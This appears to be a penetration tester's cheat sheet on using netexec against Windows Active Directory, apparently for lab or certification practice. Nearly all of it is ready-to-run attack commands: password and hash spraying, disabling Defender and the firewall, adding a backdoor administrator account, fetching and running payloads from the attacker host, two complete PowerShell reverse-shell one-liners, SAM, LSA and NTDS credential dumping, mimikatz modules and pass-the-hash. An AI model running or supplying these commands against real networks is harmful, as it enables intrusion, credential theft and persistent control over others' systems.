| SAMPLE DC RESULTS     | FROM SCANS          |
| --------------------- | ------------------- |
| NETBIOS_DOMAIN_NAME   | PENTESTING          |
| NETBIOS_COMPUTER_NAME | DC                  |
| DNS_DOMAIN_NAME       | pentesting.local    |
| DNS_COMPUTER_NAME     | dc.pentesting.local |

| SAMPLE AD RESULTS | FROM SCANS |
| --- | --- |
| NETBIOS_DOMAIN_NAME  | PENTESTING |
| NETBIOS_COMPUTER_NAME  | AD |
| DNS_DOMAIN_NAME  | pentesting.local |
| DNS_COMPUTER_NAME  | ad.pentesting.local |

| PROTOCOLS: | <<<<<<<<<< |
| --- | --- |
| ldap  | own stuff using LDAP |
| ssh  | own stuff using SSH |
| smb  | own stuff using SMB |
| mssql  | own stuff using MSSQL |
| winrm  | own stuff using WINRM |
| rdp | own stuff using RDP |

## Auto add to hosts
```
wget https://raw.githubusercontent.com/eMVee-NL/UpdateHostsFile/refs/heads/main/Update-Hosts-File.py
```

```
sudo python3 Update-Hosts-File.py --quick  --subnet 172.16.10.0/24
```

Update the DC's in `/etc/hosts`!

Example: (add final.com and dev.final.com): 
	172.16.231.180 DC01 DC01.final.com final.com
	172.16.231.192 DC02 DC02.dev.final.com dev.final.com

#### 10 SwisArmy netexec Intro
```bash - kali
netexec ldap -h
```

```bash - kali
netexec smb -h
```

```bash - kali
netexec winrm -h
```

#### 11 SwisArmy netexec Password Spraying - supports hash passing!
Assuming our target ip range is from 192.168.1.50 to 192.168.1.55.

```bash - kali
netexec smb 192.168.1.50-192.168.1.55 -u $USER -p $PASSWORD --continue-on-success
```

Look for any results that say "(Pwn3d!)"

Use a user.txt and password.txt wordlists.
```bash - kali
netexec smb 192.168.1.50-192.168.1.55 -u user.txt -p password.txt --continue-on-success
```

```bash - kali
netexec winrm 192.168.1.50-192.168.1.55 -u user.txt -p password.txt --continue-on-success
```

```bash - kali
netexec ldap 192.168.1.50-192.168.1.55 -u user.txt -p password.txt --continue-on-success
```

#### 12 SwisArmy netexec Enum 1 1
```bash - kali
netexec smb 192.168.1.50-192.168.1.55 -u $USER -p $PASSWORD --shares
```
Look for READ / WRITE privs.

Look for READ on SYSVOL.

[[Port 139 445 - SMB ~#using smbclient to download all files]]
Download all the files in SYSVOL share.

[[10._Abusing GPP 1]]

[[11._Abusing GPP 2]]

```bash - kali
netexec smb 192.168.1.50-192.168.1.55 -u $USER -p $PASSWORD --sessions
```

```bash - kali
netexec smb 192.168.1.50-192.168.1.55 -u $USER -p $PASSWORD --disks
```

```bash - kali
netexec smb 192.168.1.50-192.168.1.55 -u $USER -p $PASSWORD --loggedon-users
```

Check if any loggedon users are Domian Admins from our LDAPDomianDump finding.
```bash - kali
netexec smb 192.168.1.50-192.168.1.55 -u $USER -p $PASSWORD --users
```

#### 13 SwisArmy netexec Enum 1 2
```bash - kali
netexec smb 192.168.1.50-192.168.1.55 -u $USER -p $PASSWORD --rid-brute
```

```bash - kali
netexec smb 192.168.1.50-192.168.1.55 -u $USER -p $PASSWORD --groups
```

```bash - kali
netexec smb 192.168.1.50-192.168.1.55 -u $USER -p $PASSWORD --local-groups
```

```bash - kali
netexec smb 192.168.1.50-192.168.1.55 -u $USER -p $PASSWORD --pass-pol
```

#### 14 SwisArmy netexec Command Execution
- x : cmd
- X : PowerShell

```bash - kali
netexec winrm $TARGET -u $USER -p $PASSWORD -x 'whoami'
```

```bash - kali
netexec winrm $TARGET -u $USER -p $PASSWORD -X 'whoami'
```

```bash - kali
netexec winrm $TARGET -u $USER -p $PASSWORD -X 'whoami /groups'
```

```bash - kali
netexec winrm $TARGET -u $USER -p $PASSWORD -X 'ipconfig /all'
```

```bash - kali
netexec winrm $TARGET -u $USER -p $PASSWORD -X 'Get-MpComputerStatus'
```

Disable real time monitoring:
```bash - kali
netexec winrm $TARGET -u $USER -p $PASSWORD -X 'Set-MpPreference -DisableRealtimeMonitoring $true'
```

Disable Anti-Virus:
```bash - kali
netexec winrm $TARGET -u $USER -p $PASSWORD -X 'Set-MpPreference -DisableIOAVProtection $true'
```

Disable Firewall:
```bash - kali
netexec winrm $TARGET -u $USER -p $PASSWORD -X 'netsh advfirewall show allprofiles'
```

```bash - kali
netexec winrm $TARGET -u $USER -p $PASSWORD -X 'netsh advfirewall set allprofiles state off'
```
Get a file:

[[Python#Server]]
```bash - kali
netexec winrm $TARGET -u $USER -p $PASSWORD -X 'Invoke-WebRequest -Uri "http://$KALI/reverse.exe" -OutFile "reverse.exe"'
```

```bash - kali
netexec winrm $TARGET -u $USER -p $PASSWORD -X 'dir C:\Users\'
```

#### 15 SwisArmy netexec Command Execution + Using Local Auth
Add an admin user:
```bash - kali
netexec winrm $TARGET -u $USER -p $PASSWORD -x 'net user /add hacker Pass123'
```

Verify:
```bash - kali
netexec winrm $TARGET -u $USER -p $PASSWORD -x 'net user'
```

```bash - kali
netexec winrm $TARGET -u $USER -p $PASSWORD -x 'net localgroup administrators hacker /add'
```

Verify:
```bash - kali
netexec winrm $TARGET -u $USER -p $PASSWORD -x 'net localgroup administrators'
```

```bash - kali
netexec smb $TARGET -u $USER -p $PASSWORD --local-auth
```

#### 16 SwisArmy Get PowerShell Reverse Shell
```bash - kali
wget https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcpOneLine.ps1
```

There are 2 options below, update the IP and port.
```bash - kali
mousepad Shelly.ps1
```

OPTION1:
```bash - kali
$client = New-Object System.Net.Sockets.TCPClient('$KALI',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

OPTION2:
```bash - kali
$sm=(New-Object Net.Sockets.TCPClient('$KALI',443)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes((iex $d 2>&1));$sm.Write($st,0,$st.Length)}
```

[[Python#Server]]

[[1._rlwrap]]

```bash - kali
netexec smb $TARGET -u $USER -p $PASSWORD -X 'IEX(New-Object Net.WebClient).DownloadString("http://$KALI/Shelly.ps1")'
```

#### 17 SwisArmy Dumping SAM
NEED LOCAL ADMIN ACCESS TO WORK!

> Password hashes are found in:     C:\Windows\System32\config
> 
```bash - kali
netexec smb $TARGET -u $USER -p $PASSWORD --sam
```

Use these to Pass The Hash!
####  19 SwisArmy Dumping LSA + PTH with CME

Try dumping the DOMAIN hashes:
```bash - kali
netexec smb $TARGET -u $USER -p $PASSWORD --lsa
```

```bash - kali
john --format=NT /home/kali/.cme/logs/*.sam --wordlist=/usr/share/wordlists/rockyou.txt
```

```bash - kali
john --format=NT /home/kali/.cme/logs/*.sam --show
```
>View the contest of /home/kali/.cme/logs/*.cached:

Copy one of the hash values as seen above to attempt PTH.
```bash - kali
netexec smb $TARGET -u $USER -H $HASH -X 'whoami'
```

If the user is a Domain Admin, we can do a ntds dump against the **domain controller**:
>NTDS is the database that contains all the NTLM hashes for all the users in the entire domain.
```bash - kali
netexec smb $DOMAIN_CONTROLLER_IP -u $USER -H $HASH --ntds
```

>Results are stored in /home/kali/.cme/logs/*.ntds

Find command to cut out users > users.txt and hashes > hashes.txt

Tested with whole has vs only 2nd half, both seemed to work!
```bash - kali
netexec smb $DOMAIN_CONTROLLER_IP -u $USER -H $HASH -X 'hostname;whoami;ipconfig'
```

#### 19 SwisArmy pth winexe and xfreerdp
In this example, we did use both parts of the hash to pass:
```bash - kali
sudo pth-winexe -U $USER%$HASH //$TARGET cmd.exe
```

```bash - kali
xfreerdp /u:$USER /pth:$HASH /d:<DOMAIN> /v:$TARGET
```

#### 20 SwisArmy netexec Modules
```bash - kali
netexec smb -L
```

Dump hashes with mimikatz module:
```bash - kali
sudo netexec smb $TARGET -u $USER -p $PASSWORD -M mimikatz
```

```bash - kali
netexec winrm $DOMAIN_CONTROLLER_IP -u $USER -H $HASH -X 'whomai /all'
```

Dump hashes with lsassy module:
```bash - kali
sudo netexec smb $TARGET -u $USER -p $PASSWORD  -M lsassy
```

```bash - kali
netexec winrm $DOMAIN_CONTROLLER_IP -u $USER -H $HASH -X 'whomai /all'
```

Enable RDP:
```bash - kali
sudo netexec smb $TARGET -u $USER -p $PASSWORD -M rdp -o ACTION=enable
```

#### 21 SwisArmy netexec CMEDB
```bash - kali
sudo cmedb
```

```bash - kali
help
```

```bash - kali
proto smb
```

```bash - kali
help
```

```bash - kali
creds
```

All dumped creds will be displayed here.  Notice that each row has a Cred ID, which can be used in the netexec commands:
```bash - kali
sudo netexec smb $TARGET -id 4
```

```bash - kali
sudo netexec smb $TARGET -id 4 -X 'whoami'
```

#### 22 SwisArmy BloodHound Installation

[[8._BloodHound]]

**netexec is heavily used for credential enumeration across several protocols (ldap, ssh, smb, mssql, winrm).  CME works alongside popular modules to become an extremely powerful resource.**

```bash
sudo apt install netexec
```

```bash
netexec --help
```

#### Dictionary attack (Hashes)
Here we are attacking SMB protocol with a list of users and hashes against the domain of "Blackfield".
```bash - kali
netexec smb $TARGET -u Blackfield/users.txt -H Blackfield/hashes.txt
```

#### Dictionary attack (Passwords)
Here we found a valid username "neil", and are attempting to find a valid password by utilizing a wordlist.
```bash - kali
netexec smb $TARGET -u neil -p /usr/share/seclists/Passwords/Common-Credentials/best1050.txt
```

#### User wordlist attack with single password
Here we found a valid password "SecretOrg!", and are attempting to find a valid user by utilizing a wordlist.
```bash
netexec smb secret.csl -u users.txt -p 'SecretOrg!'
```

#### Spray username and hash
Here we found valid username and hash, and are spraying a network range to find a working target.
```bash
netexec smb x.x.x.0/24 -u fcastle -d MARVEL.local -H 64f12cddaa88057e06a81b54e73b949b
```


#### Spray username and password
Here we found valid username and password, and are spraying a network range to find a working target.
```bash
netexec smb x.x.x.0/24 -u fcastle -d MARVEL.local -p Password1
```


#### sam file dump with netexec
Here we found valid username and password, and are spraying a network range to dump sam hashes.
```bash
netexec smb x.x.x.0/24 -u fcastle -d MARVEL.local -p Password1 --sam
```

#### lsa file dump with netexec
Here we found valid username and password, and are spraying a network range to dump sam hashes.
```bash
netexec smb x.x.x.0/24 -u fcastle -d MARVEL.local -p Password1 --lsa
```
